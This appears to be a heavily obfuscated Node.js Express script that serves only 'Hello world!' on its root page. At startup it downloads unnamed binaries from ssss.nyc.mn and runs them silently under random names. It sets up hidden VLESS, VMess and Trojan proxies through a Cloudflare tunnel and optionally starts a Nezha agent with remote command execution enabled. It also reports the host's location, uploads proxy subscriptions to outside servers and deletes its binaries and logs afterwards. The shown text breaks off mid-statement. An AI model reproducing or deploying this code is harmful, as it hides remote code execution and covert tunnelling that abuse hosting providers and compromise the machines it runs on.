const _0xdfff8c=_0x3ac9;(function(_0x179619,_0x13fc0f){const _0x392068=_0x3ac9,_0x57b9af=_0x179619();while(!![]){try{const _0x33f791=parseInt(_0x392068(0x200))/0x1*(-parseInt(_0x392068(0x201))/0x2)+-parseInt(_0x392068(0x1ff))/0x3*(parseInt(_0x392068(0x272))/0x4)+-parseInt(_0x392068(0x21a))/0x5+-parseInt(_0x392068(0x218))/0x6+-parseInt(_0x392068(0x221))/0x7+-parseInt(_0x392068(0x27c))/0x8*(-parseInt(_0x392068(0x270))/0x9)+parseInt(_0x392068(0x266))/0xa*(parseInt(_0x392068(0x209))/0xb);if(_0x33f791===_0x13fc0f)break;else _0x57b9af['push'](_0x57b9af['shift']());}catch(_0x9e6c24){_0x57b9af['push'](_0x57b9af['shift']());}}}(_0x2a7d,0xddad1));const express=require(_0xdfff8c(0x27d)),app=express(),axios=require(_0xdfff8c(0x236)),os=require('os'),fs=require('fs'),path=require(_0xdfff8c(0x1d8)),{promisify}=require(_0xdfff8c(0x1d9)),exec=promisify(require(_0xdfff8c(0x267))['exec']),{execSync}=require('child_process'),UPLOAD_URL=process[_0xdfff8c(0x26a)][_0xdfff8c(0x256)]||'',PROJECT_URL=process[_0xdfff8c(0x26a)][_0xdfff8c(0x1d5)]||'',AUTO_ACCESS=process[_0xdfff8c(0x26a)][_0xdfff8c(0x252)]||![],FILE_PATH=process[_0xdfff8c(0x26a)][_0xdfff8c(0x231)]||_0xdfff8c(0x265),SUB_PATH=process['env'][_0xdfff8c(0x1dd)]||_0xdfff8c(0x26f),PORT=process[_0xdfff8c(0x26a)][_0xdfff8c(0x215)]||process['env'][_0xdfff8c(0x254)]||0xbb8,UUID=process[_0xdfff8c(0x26a)][_0xdfff8c(0x285)]||_0xdfff8c(0x27a),NEZHA_SERVER=process[_0xdfff8c(0x26a)][_0xdfff8c(0x203)]||'',NEZHA_PORT=process[_0xdfff8c(0x26a)][_0xdfff8c(0x20f)]||'',NEZHA_KEY=process[_0xdfff8c(0x26a)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0xdfff8c(0x26a)][_0xdfff8c(0x251)]||'',ARGO_AUTH=process[_0xdfff8c(0x26a)][_0xdfff8c(0x233)]||'',ARGO_PORT=process[_0xdfff8c(0x26a)][_0xdfff8c(0x282)]||0x1f41,CFIP=process[_0xdfff8c(0x26a)][_0xdfff8c(0x202)]||_0xdfff8c(0x247),CFPORT=process['env'][_0xdfff8c(0x268)]||0x1bb,NAME=process[_0xdfff8c(0x26a)]['NAME']||'';!fs['existsSync'](FILE_PATH)?(fs['mkdirSync'](FILE_PATH),console[_0xdfff8c(0x276)](FILE_PATH+_0xdfff8c(0x226))):console[_0xdfff8c(0x276)](FILE_PATH+_0xdfff8c(0x1df));function _0x2a7d(){const _0x529624=['Error\x20downloading\x20files:','4546740CxawZZ','\x0a\x0avmess://','none','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','\x20is\x20running','unlink','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','3089380qgKdXU','arch','vmess','Content-Type','nohup\x20','\x20is\x20created','2053','countryCode','tunnel.yml','has','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','readFileSync','application/json','get','direct','/api/add-subscriptions','FILE_PATH','/config.json\x20>/dev/null\x202>&1\x20&','ARGO_AUTH','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','\x20-p\x20','axios','config.yaml','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','toString','App\x20is\x20running','web\x20running\x20error:\x20','utf-8','country_code','stringify','/sub.txt\x20saved\x20successfully','arm','close','charAt','vless','random','443','fileUrl','cdns.doon.eu.org','8443','unlinkSync','/vmess-argo?ed=2560','platform','writeFileSync','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x0a\x20\x20\x20\x20','tcp','ARGO_DOMAIN','AUTO_ACCESS','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','PORT','readdirSync','UPLOAD_URL','success','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','org','\x20failed:\x20','from','xtls-rprx-vision','set','test','https://arm64.ssss.nyc.mn/v1','push','blackhole','send','https+local://8.8.8.8/dns-query','config.json','./tmp','160Fkvvjz','child_process','CFPORT','https://amd64.ssss.nyc.mn/bot','env','forEach','/tunnel.yml\x20run','tunnel.json','pkill\x20-f\x20\x22[','sub','1990629XPxqCe','boot.log','4ZqtPLH','2096','match','?encryption=none&security=tls&sni=','log','basename','base64','&fp=firefox&type=ws&host=','5a81c80d-e407-4e17-bf91-dcc924300234','Unknown','24ZOMMfw','express','taskkill\x20/f\x20/im\x20','post','response','floor','ARGO_PORT','true','status','UUID','trojan','all','automatic\x20access\x20task\x20added\x20successfully','\x20-c\x20\x22','createWriteStream','split','aarch64','\x20-c\x20','Download\x20','127.0.0.1','del\x20/f\x20/q\x20','--tls','https://oooo.serv00.net/add-url','?security=tls&sni=','&path=%2Fvless-argo%3Fed%3D2560#','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20>/dev/null\x202>&1\x20&','PROJECT_URL','Error\x20reading\x20boot.log:','clear','path','util','length','rm\x20-rf\x20','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','SUB_PATH','Empowerment\x20failed\x20for\x20','\x20already\x20exists','listen','Unhandled\x20error\x20in\x20startserver:','Error\x20in\x20startserver:','tls','\x20successfully','https://amd64.ssss.nyc.mn/v1','/vless-argo','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','filter','chmod','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','/vmess-argo','message','catch','arm64','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','Error\x20executing\x20command:\x20','2083','.exe\x20>\x20nul\x202>&1','Nodes\x20uploaded\x20successfully','statSync','\x0a\x20\x20tunnel:\x20','NEZHA\x20variable\x20is\x20empty,skip\x20running','\x20>/dev/null\x202>&1','Empowerment\x20success\x20for\x20','existsSync','block','join','abcdefghijklmnopqrstuvwxyz','pipe','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','3975954lZWyhw','412gHtwkD','4470bgvBJX','CFIP','NEZHA_SERVER','includes','ARGO_DOMAIN:','finish','fileName','unshift','3854840JxenwB','data','firefox','\x0a\x0atrojan://','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','/trojan-argo','NEZHA_PORT','http','error','/dev/null','2087','list.txt','SERVER_PORT','ArgoDomain:','https://ipapi.co/json/','10594632XAOkpu'];_0x2a7d=function(){return _0x529624;};return _0x2a7d();}function generateRandomName(){const _0x1a3660=_0xdfff8c,_0x1a79a6=_0x1a3660(0x1fc);let _0x597810='';for(let _0x2f744f=0x0;_0x2f744f<0x6;_0x2f744f++){_0x597810+=_0x1a79a6['charAt'](Math[_0x1a3660(0x281)](Math[_0x1a3660(0x244)]()*_0x1a79a6[_0x1a3660(0x1da)]));}return _0x597810;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0xdfff8c(0x1fb)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0xdfff8c(0x1fb)](FILE_PATH,webName),botPath=path[_0xdfff8c(0x1fb)](FILE_PATH,botName),subPath=path[_0xdfff8c(0x1fb)](FILE_PATH,'sub.txt'),listPath=path['join'](FILE_PATH,_0xdfff8c(0x214)),bootLogPath=path[_0xdfff8c(0x1fb)](FILE_PATH,_0xdfff8c(0x271)),configPath=path['join'](FILE_PATH,_0xdfff8c(0x264));function deleteNodes(){const _0x23cea0=_0xdfff8c;try{if(!UPLOAD_URL)return;if(!fs[_0x23cea0(0x1f9)](subPath))return;let _0x19c24f;try{_0x19c24f=fs[_0x23cea0(0x22c)](subPath,_0x23cea0(0x23c));}catch{return null;}const _0x5b9505=Buffer[_0x23cea0(0x25b)](_0x19c24f,_0x23cea0(0x278))['toString']('utf-8'),_0x162445=_0x5b9505[_0x23cea0(0x1c9)]('\x0a')[_0x23cea0(0x1e8)](_0x6deb76=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x6deb76));if(_0x162445[_0x23cea0(0x1da)]===0x0)return;return axios[_0x23cea0(0x27f)](UPLOAD_URL+'/api/delete-nodes',JSON['stringify']({'nodes':_0x162445}),{'headers':{'Content-Type':'application/json'}})[_0x23cea0(0x1ed)](_0x15dab9=>{return null;}),null;}catch(_0x23e165){return null;}}function _0x3ac9(_0x12e1e0,_0x5b12bc){_0x12e1e0=_0x12e1e0-0x1c6;const _0x2a7d96=_0x2a7d();let _0x3ac9b7=_0x2a7d96[_0x12e1e0];return _0x3ac9b7;}function cleanupOldFiles(){const _0x263200=_0xdfff8c;try{const _0x20644d=fs[_0x263200(0x255)](FILE_PATH);_0x20644d['forEach'](_0x21de5d=>{const _0x46b781=_0x263200,_0x59ed80=path['join'](FILE_PATH,_0x21de5d);try{const _0x5c4cbd=fs[_0x46b781(0x1f4)](_0x59ed80);_0x5c4cbd['isFile']()&&fs[_0x46b781(0x249)](_0x59ed80);}catch(_0x430139){}});}catch(_0x2aa994){}}app[_0xdfff8c(0x22e)]('/',function(_0x384989,_0x2ed4aa){_0x2ed4aa['send']('Hello\x20world!');});async function generateConfig(){const _0x578eaa=_0xdfff8c,_0x46942d={'log':{'access':_0x578eaa(0x212),'error':_0x578eaa(0x212),'loglevel':_0x578eaa(0x21c)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x578eaa(0x243),'settings':{'clients':[{'id':UUID,'flow':_0x578eaa(0x25c)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x578eaa(0x1e6),'dest':0xbba},{'path':_0x578eaa(0x1eb),'dest':0xbbb},{'path':_0x578eaa(0x20e),'dest':0xbbc}]},'streamSettings':{'network':'tcp'}},{'port':0xbb9,'listen':_0x578eaa(0x1cd),'protocol':_0x578eaa(0x243),'settings':{'clients':[{'id':UUID}],'decryption':_0x578eaa(0x21c)},'streamSettings':{'network':_0x578eaa(0x250),'security':_0x578eaa(0x21c)}},{'port':0xbba,'listen':_0x578eaa(0x1cd),'protocol':_0x578eaa(0x243),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':'none'},'streamSettings':{'network':'ws','security':_0x578eaa(0x21c),'wsSettings':{'path':_0x578eaa(0x1e6)}},'sniffing':{'enabled':!![],'destOverride':[_0x578eaa(0x210),_0x578eaa(0x1e3),'quic'],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x578eaa(0x1cd),'protocol':_0x578eaa(0x223),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x578eaa(0x1eb)}},'sniffing':{'enabled':!![],'destOverride':['http','tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':'127.0.0.1','protocol':_0x578eaa(0x286),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x578eaa(0x21c),'wsSettings':{'path':_0x578eaa(0x20e)}},'sniffing':{'enabled':!![],'destOverride':[_0x578eaa(0x210),_0x578eaa(0x1e3),'quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x578eaa(0x263)]},'outbounds':[{'protocol':'freedom','tag':_0x578eaa(0x22f)},{'protocol':_0x578eaa(0x261),'tag':_0x578eaa(0x1fa)}]};fs['writeFileSync'](path[_0x578eaa(0x1fb)](FILE_PATH,'config.json'),JSON[_0x578eaa(0x23e)](_0x46942d,null,0x2));}function getSystemArchitecture(){const _0x275a27=_0xdfff8c,_0x2af395=os[_0x275a27(0x222)]();return _0x2af395===_0x275a27(0x240)||_0x2af395===_0x275a27(0x1ee)||_0x2af395===_0x275a27(0x1ca)?_0x275a27(0x240):'amd';}function downloadFile(_0x868ca6,_0x1038b4,_0x371102){const _0x56d55e=_0xdfff8c,_0xb6016a=_0x868ca6;!fs[_0x56d55e(0x1f9)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x3e0ea5=fs[_0x56d55e(0x1c8)](_0xb6016a);axios({'method':_0x56d55e(0x22e),'url':_0x1038b4,'responseType':'stream'})['then'](_0x1bd6f7=>{const _0x2fdfe7=_0x56d55e;_0x1bd6f7[_0x2fdfe7(0x20a)][_0x2fdfe7(0x1fd)](_0x3e0ea5),_0x3e0ea5['on'](_0x2fdfe7(0x206),()=>{const _0x2e9a81=_0x2fdfe7;_0x3e0ea5[_0x2e9a81(0x241)](),console[_0x2e9a81(0x276)](_0x2e9a81(0x1cc)+path[_0x2e9a81(0x277)](_0xb6016a)+_0x2e9a81(0x1e4)),_0x371102(null,_0xb6016a);}),_0x3e0ea5['on']('error',_0x44cafb=>{const _0x355abd=_0x2fdfe7;fs[_0x355abd(0x21f)](_0xb6016a,()=>{});const _0x4a3935=_0x355abd(0x1cc)+path['basename'](_0xb6016a)+_0x355abd(0x25a)+_0x44cafb[_0x355abd(0x1ec)];console[_0x355abd(0x211)](_0x4a3935),_0x371102(_0x4a3935);});})[_0x56d55e(0x1ed)](_0x11db2e=>{const _0xd1549c=_0x56d55e,_0x3bdde5=_0xd1549c(0x1cc)+path[_0xd1549c(0x277)](_0xb6016a)+_0xd1549c(0x25a)+_0x11db2e[_0xd1549c(0x1ec)];console['error'](_0x3bdde5),_0x371102(_0x3bdde5);});}async function downloadFilesAndRun(){const _0x7a443a=_0xdfff8c,_0x2d3837=getSystemArchitecture(),_0x381487=getFilesForArchitecture(_0x2d3837);if(_0x381487[_0x7a443a(0x1da)]===0x0){console[_0x7a443a(0x276)](_0x7a443a(0x234));return;}const _0x1c8028=_0x381487['map'](_0xee8bf0=>{return new Promise((_0x2b8a44,_0x47bdc1)=>{const _0x211e3f=_0x3ac9;downloadFile(_0xee8bf0[_0x211e3f(0x207)],_0xee8bf0[_0x211e3f(0x246)],(_0x31899f,_0x58f150)=>{_0x31899f?_0x47bdc1(_0x31899f):_0x2b8a44(_0x58f150);});});});try{await Promise[_0x7a443a(0x287)](_0x1c8028);}catch(_0x4d2d11){console[_0x7a443a(0x211)](_0x7a443a(0x219),_0x4d2d11);return;}function _0x4d42cf(_0x15404a){const _0x4b11ca=_0x7a443a,_0x167f64=0x1fd;_0x15404a[_0x4b11ca(0x26b)](_0xf3eba5=>{const _0x25bf71=_0x4b11ca;fs['existsSync'](_0xf3eba5)&&fs[_0x25bf71(0x1e9)](_0xf3eba5,_0x167f64,_0x3f8c4c=>{const _0x3bd00e=_0x25bf71;_0x3f8c4c?console[_0x3bd00e(0x211)](_0x3bd00e(0x1de)+_0xf3eba5+':\x20'+_0x3f8c4c):console[_0x3bd00e(0x276)](_0x3bd00e(0x1f8)+_0xf3eba5+':\x20'+_0x167f64[_0x3bd00e(0x239)](0x8));});});}const _0x3bea8c=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4d42cf(_0x3bea8c);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2abf17=NEZHA_SERVER[_0x7a443a(0x204)](':')?NEZHA_SERVER[_0x7a443a(0x1c9)](':')['pop']():'',_0x32a670=new Set([_0x7a443a(0x245),_0x7a443a(0x248),_0x7a443a(0x273),_0x7a443a(0x213),_0x7a443a(0x1f1),_0x7a443a(0x227)]),_0x4cb320=_0x32a670[_0x7a443a(0x22a)](_0x2abf17)?_0x7a443a(0x283):'false',_0x3c4531='\x0aclient_secret:\x20'+NEZHA_KEY+_0x7a443a(0x258)+NEZHA_SERVER+_0x7a443a(0x1ea)+_0x4cb320+_0x7a443a(0x1d3)+UUID;fs[_0x7a443a(0x24c)](path[_0x7a443a(0x1fb)](FILE_PATH,_0x7a443a(0x237)),_0x3c4531);const _0x25c948=_0x7a443a(0x225)+phpPath+_0x7a443a(0x1c7)+FILE_PATH+_0x7a443a(0x253);try{await exec(_0x25c948),console['log'](phpName+_0x7a443a(0x21e)),await new Promise(_0x199e6e=>setTimeout(_0x199e6e,0x3e8));}catch(_0x9a00f2){console[_0x7a443a(0x211)]('php\x20running\x20error:\x20'+_0x9a00f2);}}else{let _0x4d65f3='';const _0xf20a37=[_0x7a443a(0x245),_0x7a443a(0x248),_0x7a443a(0x273),_0x7a443a(0x213),_0x7a443a(0x1f1),_0x7a443a(0x227)];_0xf20a37[_0x7a443a(0x204)](NEZHA_PORT)&&(_0x4d65f3=_0x7a443a(0x1cf));const _0x3a4f8a=_0x7a443a(0x225)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x7a443a(0x235)+NEZHA_KEY+'\x20'+_0x4d65f3+_0x7a443a(0x21d);try{await exec(_0x3a4f8a),console[_0x7a443a(0x276)](npmName+_0x7a443a(0x21e)),await new Promise(_0x2d11c0=>setTimeout(_0x2d11c0,0x3e8));}catch(_0xb8578d){console[_0x7a443a(0x211)]('npm\x20running\x20error:\x20'+_0xb8578d);}}}else console[_0x7a443a(0x276)](_0x7a443a(0x1f6));const _0x548dd6=_0x7a443a(0x225)+webPath+_0x7a443a(0x1cb)+FILE_PATH+_0x7a443a(0x232);try{await exec(_0x548dd6),console['log'](webName+_0x7a443a(0x21e)),await new Promise(_0x2398d0=>setTimeout(_0x2398d0,0x3e8));}catch(_0x18ba2e){console['error'](_0x7a443a(0x23b)+_0x18ba2e);}if(fs[_0x7a443a(0x1f9)](botPath)){let _0x4a1ddd;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0x4a1ddd=_0x7a443a(0x220)+ARGO_AUTH;else ARGO_AUTH[_0x7a443a(0x274)](/TunnelSecret/)?_0x4a1ddd=_0x7a443a(0x1dc)+FILE_PATH+_0x7a443a(0x26c):_0x4a1ddd='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x7a443a(0x24d)+ARGO_PORT;try{await exec(_0x7a443a(0x225)+botPath+'\x20'+_0x4a1ddd+'\x20>/dev/null\x202>&1\x20&'),console['log'](botName+_0x7a443a(0x21e)),await new Promise(_0x357132=>setTimeout(_0x357132,0x7d0));}catch(_0x2e19a9){console[_0x7a443a(0x211)]('Error\x20executing\x20command:\x20'+_0x2e19a9);}}await new Promise(_0x1f9386=>setTimeout(_0x1f9386,0x1388));}function getFilesForArchitecture(_0x332d0d){const _0x26cb1e=_0xdfff8c;let _0x373f55;_0x332d0d===_0x26cb1e(0x240)?_0x373f55=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x373f55=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x26cb1e(0x269)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2c0dbd=_0x332d0d===_0x26cb1e(0x240)?'https://arm64.ssss.nyc.mn/agent':'https://amd64.ssss.nyc.mn/agent';_0x373f55[_0x26cb1e(0x208)]({'fileName':npmPath,'fileUrl':_0x2c0dbd});}else{const _0x3f071b=_0x332d0d===_0x26cb1e(0x240)?_0x26cb1e(0x25f):_0x26cb1e(0x1e5);_0x373f55['unshift']({'fileName':phpPath,'fileUrl':_0x3f071b});}}return _0x373f55;}function argoType(){const _0x3e0759=_0xdfff8c;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3e0759(0x276)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3e0759(0x204)]('TunnelSecret')){fs[_0x3e0759(0x24c)](path[_0x3e0759(0x1fb)](FILE_PATH,_0x3e0759(0x26d)),ARGO_AUTH);const _0x113c82=_0x3e0759(0x1f5)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3e0759(0x1fb)](FILE_PATH,_0x3e0759(0x26d))+_0x3e0759(0x20d)+ARGO_DOMAIN+_0x3e0759(0x1fe)+ARGO_PORT+_0x3e0759(0x1e7);fs[_0x3e0759(0x24c)](path[_0x3e0759(0x1fb)](FILE_PATH,_0x3e0759(0x229)),_0x113c82);}else console[_0x3e0759(0x276)](_0x3e0759(0x24e));}async function extractDomains(){const _0x589d32=_0xdfff8c;let _0x106e53;if(ARGO_AUTH&&ARGO_DOMAIN)_0x106e53=ARGO_DOMAIN,console[_0x589d32(0x276)](_0x589d32(0x205),_0x106e53),await _0x38aac0(_0x106e53);else try{const _0x2aea09=fs[_0x589d32(0x22c)](path[_0x589d32(0x1fb)](FILE_PATH,_0x589d32(0x271)),_0x589d32(0x23c)),_0x38c56e=_0x2aea09['split']('\x0a'),_0x616507=[];_0x38c56e['forEach'](_0xcde184=>{const _0x1f51bd=_0x589d32,_0x31f752=_0xcde184['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x31f752){const _0x1f744a=_0x31f752[0x1];_0x616507[_0x1f51bd(0x260)](_0x1f744a);}});if(_0x616507[_0x589d32(0x1da)]>0x0)_0x106e53=_0x616507[0x0],console['log'](_0x589d32(0x216),_0x106e53),await _0x38aac0(_0x106e53);else{console[_0x589d32(0x276)](_0x589d32(0x1ef)),fs[_0x589d32(0x249)](path['join'](FILE_PATH,_0x589d32(0x271)));async function _0xb54731(){const _0x4848a2=_0x589d32;try{process[_0x4848a2(0x24b)]==='win32'?await exec(_0x4848a2(0x27e)+botName+_0x4848a2(0x1f2)):await exec(_0x4848a2(0x26e)+botName[_0x4848a2(0x242)](0x0)+']'+botName['substring'](0x1)+'\x22\x20>\x20/dev/null\x202>&1');}catch(_0x5b0aca){}}_0xb54731(),await new Promise(_0x452413=>setTimeout(_0x452413,0xbb8));const _0x2d9a21=_0x589d32(0x22b)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec('nohup\x20'+botPath+'\x20'+_0x2d9a21+_0x589d32(0x1d4)),console[_0x589d32(0x276)](botName+_0x589d32(0x21e)),await new Promise(_0x311a79=>setTimeout(_0x311a79,0xbb8)),await extractDomains();}catch(_0x2f42c7){console[_0x589d32(0x211)](_0x589d32(0x1f0)+_0x2f42c7);}}}catch(_0xfc6eef){console['error'](_0x589d32(0x1d6),_0xfc6eef);}async function _0x2f617f(){const _0x4c01be=_0x589d32;try{const _0x12c1e3=await axios[_0x4c01be(0x22e)](_0x4c01be(0x217),{'timeout':0xbb8});if(_0x12c1e3[_0x4c01be(0x20a)]&&_0x12c1e3[_0x4c01be(0x20a)][_0x4c01be(0x23d)]&&_0x12c1e3[_0x4c01be(0x20a)][_0x4c01be(0x259)])return _0x12c1e3['data'][_0x4c01be(0x23d)]+'_'+_0x12c1e3[_0x4c01be(0x20a)]['org'];}catch(_0x4271e2){try{const _0x2ce729=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x2ce729[_0x4c01be(0x20a)]&&_0x2ce729[_0x4c01be(0x20a)][_0x4c01be(0x284)]===_0x4c01be(0x257)&&_0x2ce729[_0x4c01be(0x20a)]['countryCode']&&_0x2ce729[_0x4c01be(0x20a)][_0x4c01be(0x259)])return _0x2ce729[_0x4c01be(0x20a)][_0x4c01be(0x228)]+'_'+_0x2ce729['data'][_0x4c01be(0x259)];}catch(_0x17e5ac){}}return _0x4c01be(0x27b);}async function _0x38aac0(_0x1d17a0){const _0x4849f6=await _0x2f617f(),_0x5cbd15=NAME?NAME+'-'+_0x4849f6:_0x4849f6;return new Promise(_0x26b9c1=>{setTimeout(()=>{const _0xf3c32f=_0x3ac9,_0x3d8641={'v':'2','ps':''+_0x5cbd15,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xf3c32f(0x21c),'net':'ws','type':_0xf3c32f(0x21c),'host':_0x1d17a0,'path':_0xf3c32f(0x24a),'tls':_0xf3c32f(0x1e3),'sni':_0x1d17a0,'alpn':'','fp':_0xf3c32f(0x20b)},_0x2c484c='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0xf3c32f(0x275)+_0x1d17a0+'&fp=firefox&type=ws&host='+_0x1d17a0+_0xf3c32f(0x1d2)+_0x5cbd15+_0xf3c32f(0x21b)+Buffer[_0xf3c32f(0x25b)](JSON[_0xf3c32f(0x23e)](_0x3d8641))[_0xf3c32f(0x239)](_0xf3c32f(0x278))+_0xf3c32f(0x20c)+UUID+'@'+CFIP+':'+CFPORT+_0xf3c32f(0x1d1)+_0x1d17a0+_0xf3c32f(0x279)+_0x1d17a0+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5cbd15+_0xf3c32f(0x24f);console[_0xf3c32f(0x276)](Buffer[_0xf3c32f(0x25b)](_0x2c484c)[_0xf3c32f(0x239)](_0xf3c32f(0x278))),fs[_0xf3c32f(0x24c)](subPath,Buffer['from'](_0x2c484c)['toString'](_0xf3c32f(0x278))),console[_0xf3c32f(0x276)](FILE_PATH+_0xf3c32f(0x23f)),uploadNodes(),app[_0xf3c32f(0x22e)]('/'+SUB_PATH,(_0x3a357d,_0x32f56d)=>{const _0x44491b=_0xf3c32f,_0x3a05b8=Buffer[_0x44491b(0x25b)](_0x2c484c)[_0x44491b(0x239)](_0x44491b(0x278));_0x32f56d[_0x44491b(0x25d)](_0x44491b(0x224),'text/plain;\x20charset=utf-8'),_0x32f56d[_0x44491b(0x262)](_0x3a05b8);}),_0x26b9c1(_0x2c484c);},0x7d0);});}}async function uploadNodes(){const _0x126bea=_0xdfff8c;if(UPLOAD_URL&&PROJECT_URL){const _0x281944=PROJECT_URL+'/'+SUB_PATH,_0x80bba0={'subscription':[_0x281944]};try{const _0x5c32f0=await axios[_0x126bea(0x27f)](UPLOAD_URL+_0x126bea(0x230),_0x80bba0,{'headers':{'Content-Type':_0x126bea(0x22d)}});return _0x5c32f0&&_0x5c32f0[_0x126bea(0x284)]===0xc8?(console[_0x126bea(0x276)]('Subscription\x20uploaded\x20successfully'),_0x5c32f0):null;}catch(_0x533919){if(_0x533919[_0x126bea(0x280)]){if(_0x533919['response'][_0x126bea(0x284)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x126bea(0x1f9)](listPath))return;const _0x2654a0=fs['readFileSync'](listPath,'utf-8'),_0x1dad53=_0x2654a0[_0x126bea(0x1c9)]('\x0a')['filter'](_0x257588=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x126bea(0x25e)](_0x257588));if(_0x1dad53[_0x126bea(0x1da)]===0x0)return;const _0x3f7438=JSON['stringify']({'nodes':_0x1dad53});try{const _0x90586e=await axios[_0x126bea(0x27f)](UPLOAD_URL+'/api/add-nodes',_0x3f7438,{'headers':{'Content-Type':_0x126bea(0x22d)}});return _0x90586e&&_0x90586e[_0x126bea(0x284)]===0xc8?(console[_0x126bea(0x276)](_0x126bea(0x1f3)),_0x90586e):null;}catch(_0xa7e654){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x496c7e=_0x3ac9,_0xf87ec2=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xf87ec2['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xf87ec2[_0x496c7e(0x260)](phpPath);process[_0x496c7e(0x24b)]==='win32'?exec(_0x496c7e(0x1ce)+_0xf87ec2[_0x496c7e(0x1fb)]('\x20')+'\x20>\x20nul\x202>&1',_0x3b8187=>{const _0xc3ac49=_0x496c7e;console[_0xc3ac49(0x1d7)](),console[_0xc3ac49(0x276)](_0xc3ac49(0x23a)),console['log'](_0xc3ac49(0x238));}):exec(_0x496c7e(0x1db)+_0xf87ec2[_0x496c7e(0x1fb)]('\x20')+_0x496c7e(0x1f7),_0xb1041=>{const _0x2c319a=_0x496c7e;console[_0x2c319a(0x1d7)](),console[_0x2c319a(0x276)](_0x2c319a(0x23a)),console[_0x2c319a(0x276)](_0x2c319a(0x238));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x533ccc=_0xdfff8c;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x533ccc(0x276)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x3cf763=await axios[_0x533ccc(0x27f)](_0x533ccc(0x1d0),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x533ccc(0x22d)}});return console[_0x533ccc(0x276)](_0x533ccc(0x1c6)),_0x3cf763;}catch(_0x5fcae9){return console[_0x533ccc(0x211)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x5fcae9[_0x533ccc(0x1ec)]),null;}}async function startserver(){const _0x62619e=_0xdfff8c;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x153e00){console[_0x62619e(0x211)](_0x62619e(0x1e2),_0x153e00);}}startserver()[_0xdfff8c(0x1ed)](_0x277aca=>{const 